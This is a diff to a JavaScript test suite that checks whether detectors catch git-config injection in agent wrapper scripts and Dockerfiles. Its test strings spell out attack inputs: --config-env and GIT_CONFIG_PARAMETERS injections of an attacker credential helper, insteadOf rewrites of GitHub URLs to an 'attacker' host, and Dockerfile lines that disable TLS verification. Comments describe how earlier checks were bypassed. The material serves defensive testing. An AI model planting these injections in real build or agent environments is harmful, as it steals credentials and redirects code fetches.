@@ -1167,6 +1167,47 @@ test("the git-config surface predicates actually fire (PEN-4541 positive control
     "the control expects exactly one planted rule — if this reads 2, the real wrapper it builds on is already poisoned and the assertion above is the one to read",
   );
 
+  // Control 1b -- the SAME attack in git's other argv spelling, and the more
+  // dangerous payload. `--config-env=<key>=<ENVVAR>` (git >= 2.31) takes the
+  // value from an environment variable, so the injected config never appears
+  // in the exec line at all.
+  //
+  // This shipped undetected at b70c7aae and was caught in review: `configFlags`
+  // read only `-c`, so the equality stayed green on a wrapper that installs an
+  // attacker's CREDENTIAL HELPER -- not a URL rewrite. That distinction is why
+  // this control asserts the insteadOf scan does NOT fire: a helper swap names
+  // no insteadOf, so the body-wide scan above is no backstop here and the
+  // equality is the only thing standing between this mutation and every agent
+  // in the fleet. Measured against git 2.47.3: both spellings add the injected
+  // helper to `git config --get-all credential.https://github.com.helper`.
+  //
+  // BOTH spellings, because git accepts the value attached or separated and
+  // only the attached one was named in review. The separated form is an
+  // ordinary parse-options string argument, not an exotic shape.
+  for (const [spelling, flag] of [
+    ["attached", "--config-env=credential.https://github.com.helper=EVIL"],
+    ["separated", "--config-env credential.https://github.com.helper=EVIL"],
+  ]) {
+    const swapped = clean.replace('  "$@"', `  ${flag} \\
+  "$@"`);
+    assert.notEqual(swapped, clean, `the ${spelling} --config-env control did not modify the wrapper — re-point it`);
+    assert.notDeepEqual(
+      configFlags(swapped),
+      EXPECTED_WRAPPER_CONFIG_FLAGS.get("git"),
+      `the flag-set equality did not notice a --config-env credential-helper swap (${spelling} spelling): it injects config with exactly the force of -c and is invisible to a check that reads only -c`,
+    );
+    assert.deepEqual(
+      insteadOfOccurrences(swapped),
+      [],
+      `the ${spelling} --config-env control is supposed to name no insteadOf — if it does, it is no longer proving that the equality catches what the insteadOf scan cannot`,
+    );
+    assert.equal(
+      swapped.split(IMAGE_WRAPPER_BIN).length - 1,
+      2,
+      "the pre-existing path-count guard was expected to stay green on this input — it counts a path, not a flag set (PEN-3748 vs PEN-4541)",
+    );
+  }
+
   // Control 2 -- casing. `git` matches config keys case-insensitively, so a
   // case-sensitive scan is defeated by typing the rule differently.
   for (const spelling of ["insteadOf", "insteadof", "INSTEADOF", "InsteadOf"]) {
@@ -1243,10 +1284,23 @@ test("the git-config surface predicates actually fire (PEN-4541 positive control
   );
 
   // Control 4 -- the argv-free injection path.
+  //
+  // GIT_CONFIG_PARAMETERS is first in the list because it is the one the
+  // enumerated regex at b70c7aae MISSED: the pattern ended in `\b`, which
+  // cannot sit between `GIT_CONFIG` and `_PARAMETERS`, so the scan returned
+  // null on git's own documented carrier for `-c` values while honouring every
+  // name somebody had thought to list. The predicate is now a prefix match, and
+  // every enumerated name below is kept as its regression proof -- widening a
+  // pattern is exactly the edit that silently stops matching what it used to.
   for (const shape of [
+    'GIT_CONFIG_PARAMETERS="\'credential.https://github.com.helper\'=\'!evil\'" exec "$@"',
+    'export GIT_CONFIG_PARAMETERS\nexec "$@"',
     'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://attacker/.insteadOf exec "$@"',
+    'GIT_CONFIG_VALUE_0=https://github.com/ exec "$@"',
     'export GIT_CONFIG_GLOBAL=/paperclip/.gitconfig\nexec "$@"',
     'GIT_CONFIG_SYSTEM=/tmp/x exec "$@"',
+    'GIT_CONFIG_NOSYSTEM=1 exec "$@"',
+    'GIT_CONFIG=/tmp/x exec "$@"',
   ]) {
     assert.notEqual(
       configInjectionEnv(shape),
@@ -1279,5 +1333,38 @@ test("the git-config surface predicates actually fire (PEN-4541 positive control
     dockerfileGitConfigInvocations("# RUN git config --system x.y z\n"),
     [],
     "the Dockerfile reader counts a commented-out line, so the prose around the real one would fail the equality",
+  );
+
+  // Control 5b -- `git config` is not the only way to spell a system-scope
+  // write. Global options sit BETWEEN the binary and the subcommand, so
+  // `git -C / config --system ...` and `git --no-pager config --system ...`
+  // write the same scope with the same force while defeating a literal
+  // `indexOf("git config")` scan (Ally review at b70c7aae, Suggestion 1).
+  for (const line of [
+    "RUN git -C / config --system url.https://attacker/.insteadOf https://github.com/",
+    "RUN git --no-pager config --system http.sslVerify false",
+    "RUN git --git-dir=/tmp/x config --system credential.helper evil",
+  ]) {
+    assert.equal(
+      dockerfileGitConfigInvocations(line).length,
+      1,
+      `the Dockerfile reader missed a global-option spelling, which writes the system scope just as forcefully: ${line}`,
+    );
+  }
+  // ...and the negative half, which is the one a widened pattern breaks: the
+  // match must still START at `git`, or every invocation it returns differs
+  // from EXPECTED_DOCKERFILE_GIT_CONFIG and the equality reds on a clean tree.
+  assert.deepEqual(
+    dockerfileGitConfigInvocations(
+      "RUN git config --system credential.https://github.com.helper '!/usr/bin/gh auth git-credential'\n",
+    ),
+    [EXPECTED_DOCKERFILE_GIT_CONFIG],
+    "the widened Dockerfile reader no longer returns the real line verbatim — the equality would red on a clean tree, which is the way a guard gets switched off",
+  );
+  // A `git` that never reaches a `config` subcommand is not a config write.
+  assert.deepEqual(
+    dockerfileGitConfigInvocations("RUN git clone https://github.com/o/r.git /tmp/r\n"),
+    [],
+    "the widened Dockerfile reader reports an ordinary git command as a config write",
   );
 });
